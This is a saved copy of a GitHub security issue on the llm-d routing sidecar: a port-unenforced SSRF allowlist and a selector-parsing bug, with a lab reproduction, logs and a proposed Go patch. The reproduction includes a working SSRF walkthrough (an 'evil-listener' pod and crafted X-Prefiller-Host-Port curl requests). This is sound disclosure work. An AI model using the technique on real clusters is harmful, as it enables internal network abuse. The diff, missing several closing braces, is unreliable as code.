---
title: 'P/D sidecar allowlist stores only pod IP, not host:port · Issue #979 · llm-d/llm-d-router'
id: pd-sidecar-allowlist-stores-only-pod-ip-not-hostport-issue-979-llm-dllm-d-router
tags:
- llmd-router-nonk8s-backends-54b774
- ssrf-protection
- pd-sidecar
created: '2026-09-11T21:56:58.237705Z'
updated: '2026-09-15T04:55:23.996121Z'
source: https://github.com/llm-d/llm-d-router/issues/979
source_domain: github.com
fetched_at: '2026-09-11T21:56:58.213880Z'
fetch_provider: crawl4ai
status: evergreen
type: note
tier: ground_truth
content_type: code
deprecated: false
summary: 'GitHub issue #979 (opened May 3 2026, status OPEN as of this research),
  ported from llm-d-inference-scheduler#1365, with a full live-cluster reproduction
  against pkg/sidecar/proxy/allowlist.go. Reports TWO bugs bundled together: BUG A
  -- updatePodsForPool read spec.selector flat instead of spec.selector.matchLabels
  for the GA InferencePool API, so the pod-selector label set was malformed and the
  pod informer''s reflector failed every list/watch, leaving the allowlist permanently
  empty (net effect: --enable-ssrf-protection=true made every P/D request 403, i.e.
  secure but completely broken). BUG B -- the allowlist stores only bare pod IPs and
  pod names with NO PORT, and IsAllowed() strips the port from the input before comparing,
  so ''an attacker with direct sidecar pod-network reach can send X-Prefiller-Host-Port:
  <allowlisted-pod-ip>:<arbitrary-port> and the sidecar will dial that arbitrary port
  on the allowlisted IP'' -- demonstrated end-to-end with a captured log of the sidecar
  POSTing a prefill body to an attacker-controlled port 9090 on an allowlisted IP.
  CROSS-CHECK AGAINST HEAD (2026-09-11 fetch of allowlist.go in this same session):
  BUG A''s fix (matchLabels-aware selectorPath, GA vs alpha API branch) IS present
  at HEAD, matching PR #1647''s merged code -- so bug A appears fixed. BUG B is NOT
  fixed at HEAD: addPodToAllowlist still inserts only podIP and podName with no port
  suffix, exactly matching the reported pre-fix behavior. This means the currently-merged
  allowlist, even when SSRF protection is fully enabled with correct InferencePool/RBAC
  setup, does not enforce the port component of x-prefiller-host-port -- a caller
  with any network reach to the sidecar can hit an arbitrary port on any allowlisted
  pod IP.'
---

*Suggested by [[allowlistgo]] — open issue documenting a known limitation of the allowlist mechanism*

[Skip to content](https://github.com/llm-d/llm-d-router/issues/979#start-of-content)
You signed in with another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/979) to refresh your session. You signed out in another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/979) to refresh your session. You switched accounts on another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/979) to refresh your session. Dismiss alert
###  Uh oh! 
There was an error while loading. [Please reload this page](https://github.com/llm-d/llm-d-router/issues/979).
/ Public
  * [ Notifications ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router) You must be signed in to change notification settings
  * [ Fork 366 ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router)
  * [ Star  333 ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router)


#  P/D sidecar allowlist stores only pod IP, not host:port
Copy link
Copy link
[P/D sidecar allowlist stores only pod IP, not host:port](https://github.com/llm-d/llm-d-router/issues/979#top)#979
Copy link
Assignees
Labels
[kind/bugCategorizes issue or PR as related to a bug.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22kind%2Fbug%22)Categorizes issue or PR as related to a bug.[needs-triageIndicates an issue or PR lacks a triage label and requires one.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22needs-triage%22)Indicates an issue or PR lacks a triage label and requires one.
## Description
opened [on May 3, 2026](https://github.com/llm-d/llm-d-router/issues/979#issue-4373265487)
Issue body actions
Ported over from llm-d [#1365](https://github.com/llm-d/llm-d-router/issues/1365) . Includes proposed fix
### Contact Details
dan@kd2ycu.com
### What happened?
The P/D routing-sidecar's SSRF allowlist (`pkg/sidecar/proxy/allowlist.go`) doesn't enforce the port portion of `host:port` lookups. The allowlist stores only pod IPs (and pod names) — no port — and `IsAllowed` strips the port from the input before comparing. With `--enable-ssrf-protection=true`, an attacker with direct sidecar pod-network reach can send `X-Prefiller-Host-Port: <allowlisted-pod-ip>:<arbitrary-port>` and the sidecar will dial that arbitrary port on the allowlisted IP.
Triggering requires direct sidecar reach (the gateway/EPP path rewrites the header), and from that position the attacker can already `curl` any pod IP directly. The bug only matters in hardened deployments where NetworkPolicy or service-mesh identity grants the sidecar reach the attacker's pod doesn't have. The allowlist is documented as a security control and currently doesn't enforce its full stated scope.
While building a live-cluster reproduction, I hit a second prerequisite bug in the same file: `updatePodsForPool` (line 274) reads `spec.selector` flat instead of `spec.selector.matchLabels`, producing an invalid label set that the pod informer rejects. Net effect: with `--enable-ssrf-protection=true` the allowlist never populates and every request returns 403 — technically secure, but breaks the legitimate prefill path. Both fixes are bundled in a proposed patch (one file, 79 insertions / 35 deletions in `pkg/sidecar/proxy/allowlist.go`); I'll paste it as a follow-up comment.
Reproduced and patch-verified end-to-end on `kind-llm-d-inference-scheduler-dev` (mode `DISAGG_P=true`) against unmodified `ghcr.io/llm-d/llm-d-routing-sidecar:dev`. Pre-fix: the routing-sidecar dials an attacker-controlled port on an allowlisted pod and POSTs the prefill body to it (smoking-gun log captured). Post-fix: same request returns HTTP 403 ("Forbidden: prefill target not allowed").
### Version
[`3758ae0`](https://github.com/llm-d/llm-d-router/commit/3758ae0a7525dcd77f3aa5e64ecdb7f72686a1a2) (main, 54 commits past gaie-1.5-sync)
### Relevant log output

```
## BUG A: pool-selector parsing failure (allowlist never populates)

E0503 13:24:48.001622  1 reflector.go:204] "Failed to watch" err="failed to list *unstructured.Unstructured: unable to parse requirement: values[0][matchLabels]: Invalid value: \"map[app:tinyllama-1-1b-chat-v1-0-inference-pool]\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')" logger="UnhandledError"

## BUG B: allowlist contents (pre-fix) — bare hosts, no ports

{"level":"info",:1777816178.961367,"logger":"allowlist-validator",:"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.11":{},"10.244.0.12":{},"10.244.0.7":{},"evil-listener":{},"vllm-d-64c6449c59-fnkr8":{},"vllm-p-8444b874cf-76d2z":{}}}

## BUG B: smoking gun: routing-sidecar dialed attacker-controlled :9090 and POSTed prefill body to evil-listener

 2026/05/03 13:50:40.000671560  length=604 from=0 to=603
POST /v1/chat/completions HTTP/1.1
Host: 10.244.0.15:8000
User-Agent: curl/8.20.0
X-Prefiller-Host-Port: 10.244.0.12:9090       ← attacker-controlled port
X-Forwarded-For: 10.244.0.16
{"kv_transfer_params":{"do_remote_decode":true,...},"messages":[{"content":,"role":"user"}],...}

## POST-FIX with allowlist contents (host:port tuples)

{"level":"info",:1777816499.2655487,"logger":"allowlist-validator",:"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.12:8000":{},"10.244.0.15:8000":{},"10.244.0.7:8000":{},"evil-listener:8000":{},"vllm-d-655d4ccb5c-9ndmg:8000":{},"vllm-p-8444b874cf-76d2z:8000":{}}}

## POST-FIX sigh same SSRF request → 403

HTTP 403
Forbidden: prefill target not allowed by SSRF protection
```

# STEPS TO REPRODUCE
Download pre-requisites

```
# Need: Docker (or Podman+compat), kind ≥ 0.20, kubectl, Go ≥ 1.22
docker --version  kind --version  kubectl version --client  go version
```

Clone the repo and bring up a P/D-disaggregation kind cluster:

```
git clone https://github.com/llm-d/llm-d-inference-scheduler
cd llm-d-inference-scheduler
DISAGG_P=true make env-dev-kind

```

After ~10–20 minutes, you should have four deployments. EPP shows CrashLoopBackoff because of an unrelated `feature gate 'prepareDataPlugins' is unknown` config issue — the LB-N1 demo bypasses the gateway entirely and connects to the routing-sidecar directly, so this doesn't block us.

```
$ kubectl get deploy -n default
NAME                                       READY   UP-TO-DATE   AVAILABLE
inference-gateway-istio                    1/1     1            1
tinyllama-1-1b-chat-v1-0-endpoint-picker   0/1     1            0   # ← unrelated upstream issue, ignore
vllm-d                                     1/1     1            1
vllm-p                                     1/1     1            1

```

Note the topology: `vllm-d` is the **decoder** , with the **`routing-sidecar`**sidecar/init container;`vllm-p` is the **prefiller**. Both pods are labelled `app: tinyllama-1-1b-chat-v1-0-inference-pool` (the InferencePool selector). The bug we're going to demonstrate is in the routing-sidecar's allowlist.

```
$ kubectl get pods -n default -l app=tinyllama-1-1b-chat-v1-0-inference-pool -o wide
NAME                      READY   STATUS    IP            NODE
vllm-d-66cd59fbd9-j5w8l   3/3     Running   10.244.0.8    llm-d-inference-scheduler-dev-control-plane
vllm-p-8444b874cf-76d2z   2/2     Running   10.244.0.7    llm-d-inference-scheduler-dev-control-plane

```

The dev cluster ships with `--enable-ssrf-protection` _off_. Turn it on for the routing-sidecar in `vllm-d` (the routing-sidecar is `initContainers[0]` because it uses Kubernetes 1.29+ native sidecars):

```
kubectl patch deployment vllm-d -n default --type=json -p=
  {"op":"replace","path":"/spec/template/spec/initContainers/0/args","value":[
    "--port=8000",
    "--vllm-port=8200",
    "--kv-connector=nixlv2",
    "--secure-proxy=false",
    "--data-parallel-size=1",
    "--enable-ssrf-protection=true",
    "--inference-pool-namespace=default",
    "--inference-pool-name=tinyllama-1-1b-chat-v1-0-inference-pool"
  ]}

kubectl rollout status deployment/vllm-d -n default --timeout=120s
```

The default ServiceAccount the sidecar runs under doesn't have InferencePool/Pod read perms — without them, the allowlist validator can't watch resources. Grant the perms and roll the deployment again so the sidecar picks them up:

```
cat 'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: routing-sidecar-allowlist
  namespace: default
rules:
  - apiGroups: ["inference.networking.k8s.io"]
    resources: ["inferencepools"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: routing-sidecar-allowlist
  namespace: default
subjects:
  - kind: ServiceAccount
    name: default
    namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: routing-sidecar-allowlist

kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Now check the routing-sidecar logs. **You're expected to see a flood of`Invalid value: "map[app:..."` errors here — that's BUG A.** The allowlist watcher can't parse the InferencePool selector, so the allowlist remains empty:

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 30 | grep -E 'allowlist|Invalid value' | head -5
```

Expected (this is the bug — it should NOT be happening):

```
{"level":"info","logger":"allowlist-validator","msg":"starting SSRF protection allowlist validator",...}
E0503 13:24:48 1 reflector.go:204] "Failed to watch" err="failed to list *unstructured.Unstructured: unable to parse requirement: values[0][matchLabels]: Invalid value: \"map[app:tinyllama-1-1b-chat-v1-0-inference-pool]\": ..."
E0503 13:24:49 1 reflector.go:204] "Failed to watch" err="..."

```

Apply the proposed patch (next, see follow-up comment), rebuild + reload the sidecar image, and roll the deployment:

```
git apply /path/to/patch.diff
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Re-check sidecar logs. The "Invalid value" errors should be gone, and the allowlist should now populate with **host:port tuples** (this is the BUG B fix taking effect):

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 50 | grep 'rebuilt allowlist' | head -1
```

Expected:

```
{"level":"info","logger":"allowlist-validator","msg":"rebuilt allowlist","targetCount":4,"targets":{"10.244.0.7:8000":{},"10.244.0.8:8000":{},"vllm-d-...:8000":{},"vllm-p-...:8000":{}}}

```

Notice the `:8000` suffixes — host:port tuples, not bare hosts. This is the post-patch state.
Now to **demonstrate that the patch actually fixes BUG B** , we need to compare behavior before and after. Below we walk through the demo against unpatched code first (to show the SSRF firing), then re-run against the patched code.
To get back to the unpatched state (so we can see BUG B fire), revert the patch and rebuild:

```
git checkout -- pkg/sidecar/proxy/allowlist.go    # OR keep BUG A fix, see note below
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

**Note:** if you `git checkout` the whole patch you'll re-introduce BUG A (allowlist never populates). To demonstrate BUG B in isolation you need the BUG A fix applied but BUG B reverted. The simplest approach is just to follow this whole repro in two passes — first against current `main` (BUG A blocks the demo), then apply the patch and verify both fixes. Alternatively, manually revert just the BUG B portion of the diff (the `addPodToAllowlist`, `IsAllowed`, `cachePoolPort`, `poolPorts` changes; keep the `updatePodsForPool` matchLabels fix).
Stand up an "evil-listener" pod with the InferencePool selector label. Its only job is to receive HTTP traffic and prove the SSRF connection happened — it listens on `:9090` (a non-prefiller port) and responds with `200 OK` so the sidecar accepts the response and the connection is logged.
Save as `evil-listener.yaml`:

```
apiVersion: v1
kind: Pod
metadata:
  name: evil-listener
  namespace: default
  labels:
    # The InferencePool's matchLabels selector — this label gets the pod
    # auto-included in the routing-sidecar's allowlist as if it were a
    # legitimate prefiller endpoint.
    app: tinyllama-1-1b-chat-v1-0-inference-pool
spec:
  containers:
    - name: ncat
      image: alpine
      command: ["sh","-c"]
      args:
        - |
          apk add --no-cache socat >/dev/null
          while true; do
            socat -v -v TCP-LISTEN:9090,reuseaddr,fork SYSTEM:'echo "HTTP/1.1 200 OK"; echo "Content-Type: application/json"; echo "Content-Length: 47"; echo; echo "{\"id\":\"x\",\"object\":\"chat.completion\",\"choices\":[]}"'
          done
      ports:
        - containerPort: 9090
```

Apply and confirm it's running with the right label:

```
kubectl apply -f evil-listener.yaml
sleep 5
kubectl get pod evil-listener -n default --show-labels
```

Expected:

```
NAME            READY   STATUS    RESTARTS   AGE   LABELS
evil-listener   1/1     Running   0          5s    app=tinyllama-1-1b-chat-v1-0-inference-pool

```

Confirm the routing-sidecar picked up evil-listener and added it to the allowlist (this is what makes the SSRF work — evil-listener's IP is treated as a legitimate prefiller endpoint):

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 10 | grep 'rebuilt allowlist' | tail -1
```

Expected (against the unpatched sidecar, before BUG B fix):

```
{"msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.7":{},"10.244.0.8":{},"10.244.0.12":{},"evil-listener":{},"vllm-d-...":{},"vllm-p-...":{}}}

```

Note the absence of port suffixes — that's the BUG B data shape. `10.244.0.12` is evil-listener.
Capture target IPs and run the three test cases from an in-cluster attacker pod (the bug requires direct sidecar reach since EPP would otherwise rewrite `X-Prefiller-Host-Port` on the gateway path):

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
SIDECAR_IP=$(kubectl get pod $VLLM_D -n default -o jsonpath='{.status.podIP}')
PREFILLER_IP=$(kubectl get pod -n default -l llm-d.ai/role=prefill -o jsonpath='{.items[0].status.podIP}')
EVIL_IP=$(kubectl get pod evil-listener -n default -o jsonpath='{.status.podIP}')

echo "Sidecar:        $SIDECAR_IP:8000"
echo "Prefiller:      $PREFILLER_IP:8000"
echo "Evil listener:  $EVIL_IP:9090   (port 9090 — NOT a prefiller port)"

kubectl run attacker -n default --rm -i --restart=Never --image=curlimages/curl --quiet --command -- sh -c 
echo '#### Test 1: legit prefiller :8000 (control — should pass) ####'
curl -s -o /tmp/r1 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${PREFILLER_IP}:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 120 /tmp/r1; echo

echo
echo '#### Test 2: SSRF on :9090 (THE BUG) ####'
curl -s -o /tmp/r2 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${EVIL_IP}:9090' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r2; echo

echo
echo '#### Test 3: non-allowlisted IP (control — should be 403) ####'
curl -s -o /tmp/r3 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: 10.244.99.99:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r3; echo

```

Expected against unpatched sidecar (this is what I observed):

```
#### Test 1: legit prefiller :8000 (control — should pass) ####
HTTP 200
{"id":"chatcmpl-d27e2759-20aa-5527-924e-9c302e4bae52","created":1777816573,"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0",...

#### Test 2: SSRF on :9090 (THE BUG) ####
HTTP 000

#### Test 3: non-allowlisted IP (control — should be 403) ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection

```

Test 2's `HTTP 000` looks like nothing happened at the client, but the bug already fired on the sidecar side. The sidecar dialed evil-listener at `:9090`, got back a fake "200 OK" body that didn't parse as a valid prefill response, and errored back to the client. The damage — a connection from the routing-sidecar's network identity to an attacker-controlled port — is already done.
Confirm the SSRF connection actually happened by reading evil-listener's logs:

```
kubectl logs evil-listener -n default --tail 30
```

Expected — note the routing-sidecar's POST arriving on port 9090 with the prefill request body intact:

```
> 2026/05/03 13:50:40.000671560  length=604 from=0 to=603
POST /v1/chat/completions HTTP/1.1
Host: 10.244.0.15:8000
User-Agent: curl/8.20.0
Content-Length: 305
X-Forwarded-For: 10.244.0.16
X-Prefiller-Host-Port: 10.244.0.12:9090       ← attacker-controlled port
X-Request-Id: 12833e0c-46f7-11f1-bd26-9e4fca54d14a
{"kv_transfer_params":{"do_remote_decode":true,...},"messages":[{"content":"hi","role":"user"}],...}
< 2026/05/03 13:50:40.000676068  length=67 from=0 to=66
HTTP/1.1 200 OK

```

That's the smoking gun: a pod the attacker controls (evil-listener) received a real prefill POST from the routing-sidecar's network identity, on a port that has no business being a prefiller port. The bug is fully demonstrated.
Now apply the patch (see follow-up comment) and re-run the demo:

```
git apply /path/to/patch.diff
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Verify the allowlist now contains host:port tuples:

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 50 | grep 'rebuilt allowlist' | tail -1
```

Expected (note the `:8000` suffixes):

```
{"msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.7:8000":{},"10.244.0.12:8000":{},"evil-listener:8000":{},"vllm-p-...:8000":{},...}}

```

evil-listener is now allowlisted at `:8000` (the InferencePool's `targetPorts[0].number`), NOT `:9090`. So a request with `X-Prefiller-Host-Port: 10.244.0.12:9090` won't match.
Re-run the three test requests from the attacker pod (same `kubectl run attacker ...` block as above) — note we update `EVIL_IP` because rolling vllm-d may have changed pod IPs:

```
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
SIDECAR_IP=$(kubectl get pod $VLLM_D -n default -o jsonpath='{.status.podIP}')
PREFILLER_IP=$(kubectl get pod -n default -l llm-d.ai/role=prefill -o jsonpath='{.items[0].status.podIP}')
EVIL_IP=$(kubectl get pod evil-listener -n default -o jsonpath='{.status.podIP}')

kubectl run attacker -n default --rm -i --restart=Never --image=curlimages/curl --quiet --command -- sh -c 
echo '#### Test 1 (post-fix): legit prefiller (control) ####'
curl -s -o /tmp/r1 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${PREFILLER_IP}:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 120 /tmp/r1; echo

echo
echo '#### Test 2 (post-fix): SSRF on :9090 — should now be 403 ####'
curl -s -o /tmp/r2 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${EVIL_IP}:9090' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r2; echo

echo
echo '#### Test 3 (post-fix): non-allowlisted IP (control) ####'
curl -s -o /tmp/r3 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: 10.244.99.99:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r3; echo

```

Expected after the patch:

```
#### Test 1 (post-fix): legit prefiller (control) ####
HTTP 200
{"id":"chatcmpl-...","created":...,"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0",...

#### Test 2 (post-fix): SSRF on :9090 — should now be 403 ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection

#### Test 3 (post-fix): non-allowlisted IP (control) ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection

```

Test 2 flipped from `HTTP 000` (sidecar dialed evil-listener:9090, got garbage, errored) to `HTTP 403` (sidecar refused to dial because `10.244.0.12:9090` doesn't match any allowlist entry). Tests 1 and 3 are unchanged.
Confirm evil-listener received no new connections after the patch:

```
kubectl logs evil-listener -n default --tail 5
```

Expected — the timestamps of the most recent log lines should still be from the _pre-fix_ request; no new POST should have arrived.
**Note:** the routing-sidecar's `RESTARTS` counter stays at 0 throughout. This isn't a crash bug — it's a control-bypass bug. The signal is "what did evil-listener receive" and "what HTTP code did the attacker see," both of which flip cleanly across the patch boundary.
Make sure to cleanup after!

```
kubectl delete pod evil-listener -n default
kubectl delete role,rolebinding routing-sidecar-allowlist -n default
make clean-env-dev-kind   # deletes the kind cluster entirely
```

**Note:** [Bug found using the N184 Bug and Vulnerability Scanner](https://github.com/MillaFleurs/N184)
## Proposed fix
Apply with `git apply patch.diff` from the repo root. The patch touches one file (`pkg/sidecar/proxy/allowlist.go`, +79 / −35) and bundles both fixes — the matchLabels selector parsing (Bug A) and the host:port allowlist (Bug B). Verified end-to-end with the reproduction in the issue body: pre-fix Test 2 returns `HTTP 000` and evil-listener receives the SSRF POST; post-fix Test 2 returns `HTTP 403 "Forbidden: prefill target not allowed"` and evil-listener receives nothing. Tests 1 and 3 (legit-prefiller and non-allowlisted-IP controls) are unchanged.
**patch.diff** (one file, 79 insertions / 35 deletions)

```
diff --git a/pkg/sidecar/proxy/allowlist.go b/pkg/sidecar/proxy/allowlist.go
index 578d042..fc582ca 100644
--- a/pkg/sidecar/proxy/allowlist.go
+++ b/pkg/sidecar/proxy/allowlist.go
@@ -20,6 +20,7 @@ import (
 	"context"
 	"fmt"
 	"net"
+	"strconv"
 	"sync"
 	"time"
 
@@ -58,10 +59,19 @@ type AllowlistValidator struct {
 
 	gvr schema.GroupVersionResource // detected GVR
 
-	// allowedTargets maps hostport -> bool for allowed prefill targets
+	// allowedTargets stores allowed host:port tuples for prefill targets.
+	// Each entry is the literal "host:port" the proxy will dial; lookups must
+	// match the full tuple (no port-stripping), to prevent SSRF against
+	// non-prefiller ports on allowlisted IPs.
 	allowedTargets   set.Set[string]
 	allowedTargetsMu sync.RWMutex
 
+	// poolPorts maps poolName -> the InferencePool's target port (as a string).
+	// Populated when an InferencePool resource is observed; used by
+	// addPodToAllowlist to construct host:port tuples.
+	poolPorts   map[string]string
+	poolPortsMu sync.RWMutex

 	// watchers for cleanup
 	poolInformer   cache.SharedInformer
 	podInformers   map[string]cache.SharedInformer
@@ -113,6 +123,7 @@ func NewAllowlistValidator(enabled bool, poolGroup, namespace, poolName string)
 		poolName:       poolName,
 		gvr:            gvr,
 		allowedTargets: set.New[string](),
+		poolPorts:      make(map[string]string),
 		podInformers:   make(map[string]cache.SharedInformer),
 		podStopChans:   make(map[string]chan struct{}),
 		stopCh:         make(chan struct{}),
@@ -195,16 +206,16 @@ func (av *AllowlistValidator) Stop() {
 	close(av.stopCh)
 }
 
-// IsAllowed checks if a given host:port combination is in the allowlist
+// IsAllowed checks if a given host:port tuple matches an entry in the allowlist.
+// The lookup is exact: both host and port must match. The previous implementation
+// stripped the port before comparing, which let an attacker use the sidecar to
+// reach arbitrary ports on allowlisted IPs.
 func (av *AllowlistValidator) IsAllowed(hostPort string) bool {
 	if !av.enabled {
 		// If SSRF protection is disabled, allow all requests (backward compatibility)
 		return true
 	}
 
-	// Clean up the hostPort input
-	hostPort = av.normalizeHostPort(hostPort)

 	av.allowedTargetsMu.RLock()
 	defer av.allowedTargetsMu.RUnlock()
 
@@ -213,24 +224,11 @@ func (av *AllowlistValidator) IsAllowed(hostPort string) bool {
 	return allowed
 }
 
-// normalizeHostPort extracts the host part from a host:port string
-func (av *AllowlistValidator) normalizeHostPort(hostPort string) string {
-	// Use net.SplitHostPort to handle IPv6 addresses and ports
-	host, _, err := net.SplitHostPort(hostPort)
-	if err != nil {
-		// If net.SplitHostPort fails, it's likely just a hostname without port
-		av.logger.V(5).Info("could not parse host:port, treating as hostname",
-			"input", hostPort,
-			"error", err.Error())
-		return hostPort

-	return host


 // onInferencePoolAdd handles new InferencePool resources
 func (av *AllowlistValidator) onInferencePoolAdd(obj interface{}) {
 	pool := obj.(*unstructured.Unstructured)
 	av.logger.Info("InferencePool added", "name", pool.GetName())
+	av.cachePoolPort(pool)
 	av.updatePodsForPool(pool)
 }
 
@@ -238,6 +236,7 @@ func (av *AllowlistValidator) onInferencePoolAdd(obj interface{}) {
 func (av *AllowlistValidator) onInferencePoolUpdate(_, newObj interface{}) {
 	pool := newObj.(*unstructured.Unstructured)
 	av.logger.Info("InferencePool updated", "name", pool.GetName())
+	av.cachePoolPort(pool)
 	av.updatePodsForPool(pool)
 }
 
@@ -256,10 +255,43 @@ func (av *AllowlistValidator) onInferencePoolDelete(obj interface{}) {
 	delete(av.podInformers, poolName)
 	av.podInformersMu.Unlock()
 
+	av.poolPortsMu.Lock()
+	delete(av.poolPorts, poolName)
+	av.poolPortsMu.Unlock()

 	// Remove targets associated with this pool (simplified - removes all and rebuilds)
 	av.rebuildAllowlist()
 }
 
+// cachePoolPort reads spec.targetPorts[0].number from the unstructured pool
+// object and stores it on the validator for use by addPodToAllowlist. If the
+// pool has multiple target ports, we cache only the first — multi-port pool
+// support would need a richer poolPorts type.
+func (av *AllowlistValidator) cachePoolPort(pool *unstructured.Unstructured) {
+	poolName := pool.GetName()
+	ports, found, err := unstructured.NestedSlice(pool.Object, "spec", "targetPorts")
+	if err != nil || !found || len(ports) == 0 {
+		av.logger.V(3).Info("InferencePool has no spec.targetPorts; allowlist will not include any host:port for this pool",
+			"pool", poolName, "found", found, "err", err)
+		return

+	first, ok := ports[0].(map[string]interface{})
+	if !ok {
+		av.logger.V(3).Info("spec.targetPorts[0] is not a map; ignoring", "pool", poolName)
+		return

+	num, found, err := unstructured.NestedInt64(first, "number")
+	if err != nil || !found {
+		av.logger.V(3).Info("spec.targetPorts[0].number missing or wrong type; ignoring",
+			"pool", poolName, "err", err)
+		return

+	av.poolPortsMu.Lock()
+	av.poolPorts[poolName] = strconv.FormatInt(num, 10)
+	av.poolPortsMu.Unlock()
+	av.logger.V(4).Info("cached pool target port", "pool", poolName, "port", num)


 // updatePodsForPool starts or updates pod watching for a specific InferencePool
 func (av *AllowlistValidator) updatePodsForPool(poolObj *unstructured.Unstructured) {
 	poolName := poolObj.GetName()
@@ -271,17 +303,16 @@ func (av *AllowlistValidator) updatePodsForPool(poolObj *unstructured.Unstructur
 		return
 	}
 
-	selectorData, found, err := unstructured.NestedMap(spec, "selector")
+	// InferencePool.spec.selector is a LabelSelector (matchLabels + optional matchExpressions).
+	// Read matchLabels — the only form the upstream API currently uses. Reading
+	// "selector" directly produces a map-shaped value (e.g. "map[app:...]") that
+	// fails K8s label validation in the pod informer.
+	matchLabelsData, found, err := unstructured.NestedStringMap(spec, "selector", "matchLabels")
 	if err != nil || !found {
-		av.logger.Error(err, "InferencePool missing or invalid selector field", "name", poolName, "found", found)
+		av.logger.Error(err, "InferencePool missing or invalid selector.matchLabels field", "name", poolName, "found", found)
 		return
 	}

-	// Convert to labels.Selector
-	labelSelector := labels.Set{}
-	for k, v := range selectorData {
-		labelSelector[k] = fmt.Sprintf("%v", v)

+	labelSelector := labels.Set(matchLabelsData)
 
 	// Create or update pod informer for this selector
